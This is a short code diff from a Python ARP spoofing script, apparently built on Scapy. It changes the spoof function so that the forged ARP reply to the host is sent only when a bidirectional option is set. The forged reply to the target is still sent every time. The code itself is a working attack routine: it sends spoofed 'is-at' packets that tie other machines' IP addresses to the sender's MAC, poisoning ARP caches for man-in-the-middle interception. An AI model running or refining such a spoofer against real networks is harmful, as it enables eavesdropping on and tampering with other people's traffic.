@@ -46,9 +46,10 @@ def spoof(target_ip, host_ip, runs, bidirectional):
         # Send the packet and report
         send(target_arp_response, verbose = 0)
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, local_mac))
-        # Send the packet and report
-        send(host_arp_response, verbose = 0)
-        print("[+] Sent to {} : {} is-at {}".format(host_ip, target_ip, local_mac))
+        if(bidirectional):
+            # Send the packet and report
+            send(host_arp_response, verbose = 0)
+            print("[+] Sent to {} : {} is-at {}".format(host_ip, target_ip, local_mac))
         x = x + 1
 
 def user_welcome():
